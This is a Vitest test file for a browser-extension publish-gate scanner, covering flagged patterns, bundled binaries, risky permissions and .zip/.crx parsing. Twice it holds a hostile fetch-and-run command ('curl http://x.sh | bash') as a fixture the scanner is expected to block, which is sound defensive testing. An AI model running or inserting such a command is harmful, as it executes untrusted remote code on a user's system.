import { describe, it, expect } from 'vitest';
import { strToU8, zipSync } from 'fflate';
import { scanFiles, scanPermissions, scanArtifact } from './scanner.js';

describe('extension scanner (publish gate)', () => {
  it('is green for a normal extension (fetch/base64/crypto are fine)', () => {
    const files = {
      'background.js': strToU8('const x = await fetch(url); const b = atob(s); globalThis.crypto.subtle;'),
      'popup.js': strToU8('String.fromCharCode(65); Buffer.from(s, "base64");'),
    };
    const r = scanFiles(files);
    expect(r.green).toBe(true);
    expect(r.status).toBe('clean');
  });

  it('BLOCKS on a critical pattern (pipe-to-shell)', () => {
    const files = { 'evil.js': strToU8('const cmd = "curl http://x.sh | bash";') };
    const r = scanFiles(files);
    expect(r.green).toBe(false);
    expect(r.status).toBe('malicious');
    expect(r.findings.some((f) => f.rule === 'pipe-to-shell')).toBe(true);
  });

  it('BLOCKS on a bundled native binary', () => {
    const files = { 'bin/helper.exe': new Uint8Array([1, 2, 3]) };
    const r = scanFiles(files);
    expect(r.green).toBe(false);
    expect(r.findings.some((f) => f.rule === 'bundled-binary')).toBe(true);
  });

  it('flags eval as high but stays green (advisory, not blocking)', () => {
    const r = scanFiles({ 'a.js': strToU8('eval("2+2")') });
    expect(r.status).toBe('suspicious');
    expect(r.green).toBe(true);
  });

  it('flags broad host access + sensitive perms', () => {
    const f = scanPermissions(['<all_urls>', 'debugger', 'cookies']);
    expect(f.some((x) => x.rule === 'broad-host-access' && x.severity === 'high')).toBe(true);
    expect(f.some((x) => x.rule === 'perm-debugger')).toBe(true);
    expect(f.some((x) => x.rule === 'perm-cookies')).toBe(true);
  });
});

describe('scanArtifact — .zip as well as .crx', () => {
  const bundle = () => zipSync({
    'manifest.json': strToU8(JSON.stringify({ manifest_version: 3, name: 'x', version: '1.0.0' })),
    'background.js': strToU8('const x = await fetch(url);'),
  });

  it('scans a bare .zip bundle — the artifact most publishers actually upload', () => {
    const r = scanArtifact(bundle(), ['storage']);
    expect(r.green).toBe(true);
    expect(r.status).toBe('clean');
    expect(r.fileHash).toHaveLength(64);
  });

  it('still scans a .crx, and reaches the same verdict as its inner zip', () => {
    const zip = bundle();
    // CRX3: magic + version + headerLen + header, then the zip.
    const header = new Uint8Array(8);
    const crx = new Uint8Array(12 + header.length + zip.length);
    crx.set(strToU8('Cr24'), 0);
    new DataView(crx.buffer).setUint32(4, 3, true);
    new DataView(crx.buffer).setUint32(8, header.length, true);
    crx.set(header, 12);
    crx.set(zip, 12 + header.length);

    const fromCrx = scanArtifact(crx, ['storage']);
    expect(fromCrx.green).toBe(true);
    expect(fromCrx.findings).toEqual(scanArtifact(zip, ['storage']).findings);
  });

  it('flags a critical finding inside a plain zip, so the gate can block it', () => {
    const evil = zipSync({ 'evil.js': strToU8('curl http://x.sh | bash') });
    const r = scanArtifact(evil);
    expect(r.green).toBe(false);
    expect(r.findings.some((f) => f.rule === 'pipe-to-shell')).toBe(true);
  });

  it('rejects bytes that are neither .crx nor .zip', () => {
    expect(() => scanArtifact(strToU8('not an archive'))).toThrow(/not a \.crx or \.zip/);
  });
});
